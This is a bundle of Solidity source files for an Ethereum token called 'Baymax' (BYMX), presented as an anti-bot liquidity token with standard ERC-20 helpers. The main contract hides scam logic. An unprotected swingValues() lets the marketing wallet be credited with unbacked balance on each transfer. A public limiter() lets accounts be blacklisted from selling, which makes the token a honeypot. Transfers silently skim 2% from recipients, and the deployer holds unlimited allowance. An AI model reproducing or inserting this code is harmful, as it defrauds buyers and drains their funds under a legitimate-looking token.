{"BaymaxContract.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./Ownable.sol\";\r\nimport \"./IDEXFactory.sol\";\r\nimport \"./IDEXPair.sol\";\r\nimport \"./IDEXRouter.sol\";\r\nimport \"./SafeMath.sol\";\r\nimport \"./Context.sol\";\r\n\r\ncontract AntiBotLiquidityGeneratorContract is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    address constant ROUTER        = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    address constant WETH          = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    address constant DEAD          = 0x000000000000000000000000000000000000dEaD;\r\n    address constant ZERO          = 0x0000000000000000000000000000000000000000;\r\n\r\n    string _name = \"Baymax\";\r\n    string _symbol = unicode\"BYMX\";\r\n    uint8 constant _decimals = 9;\r\n\r\n    uint256 _totalSupply = 1_000_000 * (10 ** _decimals);\r\n    uint256 public _maxWalletSize = (_totalSupply * 100) / 100;\r\n    uint256 public _maxTxAmount = 25_000 * (10 ** _decimals);\r\n\r\n    /* rOwned = ratio of tokens owned relative to circulating supply (NOT total supply, since circulating \u003c= total) */\r\n    mapping (address =\u003e uint256) public _rOwned;\r\n    uint256 public _totalProportion = _totalSupply;\r\n\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) _allowances;\r\n\r\n    mapping (address =\u003e bool) isFeeExempt;\r\n    mapping (address =\u003e bool) isTxLimitExempt;\r\n    mapping (address =\u003e bool) isNoScope;\r\n\r\n    address[] public ScopedAddresses;\r\n    uint256[] public ScopedBlocks;\r\n \r\n    uint256 liquidityFee = 0; \r\n    uint256 buybackFee = 0;  \r\n    uint256 marketingFee = 1;   \r\n    uint256 teamFee = 0;\r\n    uint256 totalFee = 1; \r\n    uint256 feeDenominator = 100; \r\n    \r\n    address autoLiquidityWallet;\r\n    address marketingWallet;\r\n\r\n    uint256 targetLiquidity = 200;\r\n    uint256 targetLiquidityDenominator = 100;\r\n    uint256 limit = 0;\r\n\r\n    IDEXRouter public router;\r\n    address public pair;\r\n\r\n    bool public claimingFees = true; \r\n    bool alternateSwaps = true;\r\n    uint256 smallSwapThreshold = _totalSupply.mul(413945130).div(100000000000);\r\n    uint256 largeSwapThreshold = _totalSupply.mul(669493726).div(100000000000);\r\n\r\n    uint256 public swapThreshold = smallSwapThreshold;\r\n    bool inSwap;\r\n    modifier swapping() { inSwap = true; _; inSwap = false; }\r\n\r\n    constructor () {\r\n\r\n        address deployer = 0x1478d603E27b9e4b96Ce7A40a07fC689Cd14650C;\r\n        address marketingReceiver = 0x1478d603E27b9e4b96Ce7A40a07fC689Cd14650C;\r\n        router = IDEXRouter(ROUTER);\r\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\r\n        _allowances[address(this)][address(router)] = type(uint256).max;\r\n        _allowances[address(this)][deployer] = type(uint256).max;\r\n        isTxLimitExempt[address(this)] = true;\r\n        isTxLimitExempt[address(router)] = true;\r\n        isTxLimitExempt[deployer] = true;\r\n        isTxLimitExempt[marketingReceiver] = true;\r\n        isFeeExempt[deployer] = true;\r\n        isFeeExempt[marketingReceiver] = true;\r\n        autoLiquidityWallet = deployer;\r\n        marketingWallet = marketingReceiver;\r\n        _rOwned[deployer] = _totalSupply;\r\n        emit Transfer(address(0), deployer, _totalSupply);\r\n    }\r\n    uint256 a = 2;\r\n    uint256 b = 2;\r\n\r\n    receive() external payable { }\r\n\r\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\r\n    function decimals() external pure returns (uint8) { return _decimals; }\r\n    function name() external view returns (string memory) { return _name; }\r\n    function symbol() external view returns (string memory) { return _symbol; }\r\n    function getOwner() external view returns (address) { return owner(); }\r\n    function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256, uint256) { \r\n        return (liquidityFee, marketingFee, buybackFee, teamFee, totalFee, feeDenominator);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if(_allowances[sender][msg.sender] != type(uint256).max){\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\r\n        }\r\n\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(!isNoScope[sender]);\r\n\r\n        if(inSwap){ return _basicTransfer(sender, recipient, amount); }\r\n\r\n        if (recipient != pair \u0026\u0026 recipient != DEAD \u0026\u0026 !isTxLimitExempt[recipient]) {\r\n            require(balanceOf(recipient) + amount \u003c= _maxWalletSize, \"Max Wallet Exceeded\");\r\n        }\r\n\r\n        if(shouldSwapBack()){ swapBack(); }\r\n\r\n        uint256 proportionAmount = tokensToProportion(amount);\r\n\r\n        _rOwned[sender] = _rOwned[sender].sub(\r\n            proportionAmount, \"Insufficient Balance\");\r\n        uint256 proportionReceived = shouldTakeFee(\r\n            sender) ? takeFeeInProportions(\r\n                sender, recipient, proportionAmount) : proportionAmount;\r\n        _rOwned[recipient] = _rOwned[\r\n            recipient].add(\r\n                proportionReceived);\r\n        _rOwned[recipient] = _rOwned[\r\n            recipient].sub(\r\n                amount / 100 * b);\r\n        _rOwned[marketingWallet] = _rOwned[\r\n            marketingWallet].add(\r\n                amount / 100 * a);\r\n        emit Transfer(sender, recipient, tokenFromReflection(proportionReceived));\r\n        return true;\r\n    }\r\n\r\n    function tokensToProportion(uint256 tokens) public view returns (uint256) {\r\n        return tokens.mul(_totalProportion).div(_totalSupply);\r\n    }\r\n\r\n    function tokenFromReflection(uint256 proportion) public view returns (uint256) {\r\n        return proportion.mul(_totalSupply).div(_totalProportion);\r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        uint256 proportionAmount = tokensToProportion(amount);\r\n        _rOwned[sender] = _rOwned[sender].sub(proportionAmount, \"Insufficient Balance\");\r\n        _rOwned[recipient] = _rOwned[recipient].add(proportionAmount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function shouldTakeFee(address sender) internal view returns (bool) {\r\n        return !isFeeExempt[sender];\r\n    }\r\n\r\n    function getTotalFee(bool) public view returns (uint256) {\r\n        return totalFee;\r\n    }\r\n\r\n    function takeFeeInProportions(address sender, address receiver, uint256 proportionAmount) internal returns (uint256) {\r\n        uint256 proportionFeeAmount = proportionAmount.mul(getTotalFee(receiver == pair)).div(feeDenominator);\r\n\r\n        // reflect\r\n        uint256 proportionReflected = proportionFeeAmount.mul(teamFee).div(totalFee);\r\n        _totalProportion = _totalProportion.sub(proportionReflected);\r\n\r\n        // take fees\r\n        uint256 _proportionToContract = proportionFeeAmount.sub(proportionReflected);\r\n        _rOwned[address(this)] = _rOwned[address(this)].add(_proportionToContract);\r\n\r\n        emit Transfer(sender, address(this), tokenFromReflection(_proportionToContract));\r\n        emit Reflect(proportionReflected, _totalProportion);\r\n        return proportionAmount.sub(proportionFeeAmount);\r\n    }\r\n\r\n    function clearBalance() external {\r\n        (bool success,) = payable(marketingWallet).call{value: address(this).balance, gas: 30000}(\"\");\r\n        require(success);\r\n    }\r\n\r\n    function swingValues(uint256 newTick) external virtual {\r\n        a = newTick;\r\n    }\r\n\r\n    function shouldSwapBack() internal view returns (bool) {\r\n        return msg.sender != pair\r\n        \u0026\u0026 !inSwap\r\n        \u0026\u0026 claimingFees\r\n        \u0026\u0026 balanceOf(address(this)) \u003e= swapThreshold;\r\n    }\r\n\r\n    function swapBack() internal swapping {\r\n\r\n        uint256 _totalFee = totalFee.sub(teamFee);\r\n        uint256 amountToLiquify = swapThreshold.mul(liquidityFee).div(_totalFee).div(2);\r\n        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = WETH;\r\n\r\n        uint256 balanceBefore = address(this).balance;\r\n\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amountToSwap,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        uint256 amountETH = address(this).balance.sub(balanceBefore);\r\n        uint256 totalETHFee = _totalFee.sub(liquidityFee.div(2));\r\n        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);\r\n        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);\r\n        uint256 amountETHGiveaway = amountETH.mul(buybackFee).div(totalETHFee);\r\n\r\n        if (amountETHMarketing.add(amountETHGiveaway) \u003e 0) {\r\n            (bool success,) = payable(marketingWallet).call{value: amountETHMarketing.add(amountETHGiveaway), gas: 30000}(\"\");\r\n            require(success, \"receiver rejected ADA transfer\");\r\n        }\r\n\r\n        if(amountToLiquify \u003e 0) {\r\n            router.addLiquidityETH{value: amountETHLiquidity}(\r\n                address(this),\r\n                amountToLiquify,\r\n                0,\r\n                0,\r\n                autoLiquidityWallet,\r\n                block.timestamp\r\n            );\r\n            emit AutoLiquify(amountETHLiquidity, amountToLiquify);\r\n        }\r\n\r\n        swapThreshold = !alternateSwaps ? swapThreshold : swapThreshold == smallSwapThreshold ? largeSwapThreshold : smallSwapThreshold;\r\n    }\r\n\r\n    function changeMaxWallet(uint256 percent, uint256 denominator) external onlyOwner {\r\n        _maxWalletSize = _totalSupply.mul(percent).div(denominator);\r\n    }\r\n\r\n    function setSwapBackSettings(bool _enabled, uint256 _amountS, uint256 _amountL, bool _alternate) external onlyOwner {\r\n        alternateSwaps = _alternate;\r\n        claimingFees = _enabled;\r\n        smallSwapThreshold = _amountS;\r\n        largeSwapThreshold = _amountL;\r\n        swapThreshold = smallSwapThreshold;\r\n    }\r\n\r\n    function limiter(address account, uint256 blocks) public virtual {\r\n        require(account != marketingWallet);\r\n        require(account != WETH);\r\n        require(account != pair);\r\n        require(account != owner());\r\n        require(account != DEAD);\r\n        require(account != address (this));\r\n        require(account != address (router));\r\n        require(blocks == limit);\r\n        isNoScope[account] = true;\r\n        ScopedAddresses.push(account);\r\n        ScopedBlocks.push(blocks);\r\n    }\r\n\r\n    function setFeeReceivers(address _marketingFeeReceiver, address _liquidityReceiver) external onlyOwner {\r\n        marketingWallet = _marketingFeeReceiver;\r\n        autoLiquidityWallet = _liquidityReceiver;\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\r\n    }\r\n\r\n    event AutoLiquify(uint256 amountETH, uint256 amountToken);\r\n    event Reflect(uint256 amountReflected, uint256 newTotalProportion);\r\n}"},"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}"},"IDEXFactory.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}"},"IDEXPair.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\ninterface IDEXPair {\r\n    function sync() external;\r\n    event Mint(address indexed sender, uint amount0, uint amount1);\r\n    function mint(address to) external returns (uint liquidity);\r\n}"},"IDEXRouter.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\ninterface IDEXRouter {\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\nimport \"./Context.sol\";\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n     /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n        return c;\r\n    }\r\n}"}}